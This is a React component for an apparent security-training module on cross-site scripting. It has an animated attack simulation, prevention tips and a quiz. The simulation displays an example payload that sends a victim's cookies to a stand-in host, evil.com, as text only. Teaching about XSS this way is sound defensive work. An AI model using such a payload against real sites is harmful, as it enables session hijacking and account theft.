"use client";

import { useState } from "react";
import { CheckCircle, Play, ShieldAlert, XCircle } from "lucide-react";
import MissionLayout from "../MissionLayout";

export default function MissionSecurity5AttackDemo({ onComplete }: { onComplete: () => void }) {
    const [stage, setStage] = useState<"idle" | "injecting" | "executing" | "stealing" | "done">("idle");
    const [quizAnswer, setQuizAnswer] = useState<string | null>(null);
    const [quizResult, setQuizResult] = useState<boolean | null>(null);

    const runSimulation = () => {
        setStage("injecting");
        setTimeout(() => setStage("executing"), 1500);
        setTimeout(() => setStage("stealing"), 3000);
        setTimeout(() => setStage("done"), 4500);
    };

    const handleQuizSubmit = () => {
        if (quizAnswer === "a") {
            setQuizResult(true);
        } else {
            setQuizResult(false);
        }
    };

    const description = (
        <div className="space-y-4">
            <p className="text-lg text-gray-300">
                Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious scripts into trusted websites. These scripts execute in the victim's browser, allowing attackers to steal session cookies, redirect users, or deface websites.
            </p>
        </div>
    );

    const realWorldCases = (
        <div className="space-y-4">
            <div className="bg-white/5 p-4 rounded-lg border border-white/10">
                <h4 className="font-bold text-white mb-2">Stored XSS</h4>
                <p className="text-sm text-gray-400">
                    An attacker posts a comment containing a script. Every user who views the comment executes the script.
                </p>
            </div>
            <div className="bg-white/5 p-4 rounded-lg border border-white/10">
                <h4 className="font-bold text-white mb-2">Reflected XSS</h4>
                <p className="text-sm text-gray-400">
                    An attacker sends a link with a malicious script in the URL parameters. The server reflects the script back to the user's browser.
                </p>
            </div>
        </div>
    );

    const protection = (
        <div className="space-y-4">
            <h3 className="text-xl font-bold text-blue-400">XSS Prevention</h3>
            <ul className="list-disc pl-5 space-y-2 text-gray-300">
                <li>
                    <strong className="text-white">Output Encoding:</strong> Convert special characters into their HTML entity equivalents (e.g., `&lt;` becomes `&amp;lt;`) before rendering them in the browser.
                </li>
                <li>
                    <strong className="text-white">Content Security Policy (CSP):</strong> A browser feature that allows you to whitelist trusted sources of executable scripts.
                </li>
                <li>
                    <strong className="text-white">HttpOnly Cookies:</strong> Mark session cookies as HttpOnly so they cannot be accessed by JavaScript.
                </li>
            </ul>
        </div>
    );

    const tryYourself = (
        <div className="flex flex-col items-center gap-8 w-full max-w-2xl mx-auto">
            <div className="text-center">
                <h3 className="text-xl font-bold text-red-500 mb-2 flex items-center justify-center gap-2">
                    <ShieldAlert className="w-6 h-6" /> XSS Attack Simulation
                </h3>
                <p className="text-gray-400">Watch how a Cross-Site Scripting attack steals cookies.</p>
            </div>

            <div className="w-full h-64 bg-gray-900 rounded-xl border border-white/10 relative overflow-hidden flex items-center justify-center">
                {stage === "idle" && (
                    <button
                        onClick={runSimulation}
                        className="px-6 py-3 bg-red-600 hover:bg-red-500 text-white rounded-full font-bold transition-colors flex items-center gap-2"
                    >
                        <Play className="w-5 h-5" /> Simulate Attack
                    </button>
                )}

                {stage !== "idle" && (
                    <div className="w-full h-full p-8 relative">
                        {/* Browser Context */}
                        <div className="absolute top-4 left-4 text-gray-500 font-mono text-xs">Browser Window</div>

                        {/* Victim's Cookie */}
                        <div className={`absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-yellow-500 text-black px-4 py-2 rounded-full font-bold shadow-lg transition-all duration-1000 ${stage === "stealing" ? "translate-x-[200px] opacity-0" : ""}`}>
                            🍪 Session Cookie
                        </div>

                        {/* Malicious Script */}
                        <div className={`absolute bottom-4 left-4 font-mono text-green-400 text-sm transition-opacity duration-500 ${stage === "injecting" ? "opacity-100" : "opacity-0"}`}>
                            &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;
                        </div>

                        {/* Attacker Server */}
                        <div className="absolute top-4 right-4 text-red-500 font-bold flex flex-col items-center">
                            <div className="w-12 h-12 border-2 border-red-500 rounded-lg flex items-center justify-center mb-2">
                                😈
                            </div>
                            Attacker
                        </div>

                        {/* Status Text */}
                        <div className="absolute bottom-8 w-full text-center font-bold text-white">
                            {stage === "injecting" && "Malicious script injected into comment..."}
                            {stage === "executing" && "Browser executes script automatically..."}
                            {stage === "stealing" && "Script sends cookie to attacker!"}
                            {stage === "done" && <span className="text-red-400">Account Compromised!</span>}
                        </div>
                    </div>
                )}
            </div>

            {stage === "done" && (
                <div className="animate-in fade-in slide-in-from-bottom-4 flex flex-col items-center gap-4">
                    <p className="text-gray-300 text-center max-w-md">
                        This is why we must always sanitize user input and use Content Security Policy (CSP).
                    </p>
                    <div className="animate-in fade-in zoom-in text-green-400 font-bold flex items-center gap-2 bg-green-500/10 px-6 py-3 rounded-full border border-green-500/20">
                        <CheckCircle className="w-5 h-5" /> Simulation Complete! Proceed to Quiz.
                    </div>
                </div>
            )}
        </div>
    );

    const quiz = (
        <div className="max-w-2xl mx-auto">
            <h3 className="text-xl font-bold text-white mb-6">Test Your Knowledge</h3>
            <div className="bg-white/5 p-6 rounded-xl border border-white/10">
                <p className="text-lg mb-4">What does XSS stand for?</p>
                <div className="space-y-3">
                    <label className="flex items-center gap-3 p-4 rounded-lg bg-black/20 hover:bg-white/5 cursor-pointer transition-colors">
                        <input
                            type="radio"
                            name="quiz"
                            value="a"
                            checked={quizAnswer === "a"}
                            onChange={(e) => setQuizAnswer(e.target.value)}
                            className="w-5 h-5 text-blue-500"
                        />
                        <span>Cross-Site Scripting</span>
                    </label>
                    <label className="flex items-center gap-3 p-4 rounded-lg bg-black/20 hover:bg-white/5 cursor-pointer transition-colors">
                        <input
                            type="radio"
                            name="quiz"
                            value="b"
                            checked={quizAnswer === "b"}
                            onChange={(e) => setQuizAnswer(e.target.value)}
                            className="w-5 h-5 text-blue-500"
                        />
                        <span>Extra Secure Sockets</span>
                    </label>
                    <label className="flex items-center gap-3 p-4 rounded-lg bg-black/20 hover:bg-white/5 cursor-pointer transition-colors">
                        <input
                            type="radio"
                            name="quiz"
                            value="c"
                            checked={quizAnswer === "c"}
                            onChange={(e) => setQuizAnswer(e.target.value)}
                            className="w-5 h-5 text-blue-500"
                        />
                        <span>XML Style Sheets</span>
                    </label>
                </div>

                <div className="mt-6 flex flex-col gap-4">
                    <div className="flex items-center gap-4">
                        <button
                            onClick={handleQuizSubmit}
                            disabled={!quizAnswer || quizResult === true}
                            className="px-6 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-lg font-bold disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                        >
                            Submit Answer
                        </button>

                        {quizResult === true && (
                            <span className="text-green-400 font-bold flex items-center gap-2 animate-in fade-in slide-in-from-left-2">
                                <CheckCircle className="w-5 h-5" /> Correct!
                            </span>
                        )}

                        {quizResult === false && (
                            <span className="text-red-400 font-bold flex items-center gap-2 animate-in fade-in slide-in-from-left-2">
                                <XCircle className="w-5 h-5" /> Incorrect.
                            </span>
                        )}
                    </div>

                    {quizResult === true && (
                        <button
                            onClick={onComplete}
                            className="w-full py-4 bg-gradient-to-r from-green-500 to-emerald-600 rounded-xl font-bold text-white shadow-lg shadow-green-500/20 hover:shadow-green-500/40 hover:scale-[1.02] transition-all flex items-center justify-center gap-2 animate-in fade-in slide-in-from-bottom-2"
                        >
                            <CheckCircle className="w-6 h-6" /> Complete Mission
                        </button>
                    )}
                </div>
            </div>
        </div>
    );

    return (
        <MissionLayout
            title="XSS Attack Simulation"
            description={description}
            realWorldCases={realWorldCases}
            protection={protection}
            protectionLabel="Best Practices"
            tryYourself={tryYourself}
            quiz={quiz}
            onComplete={onComplete}
        />
    );
}
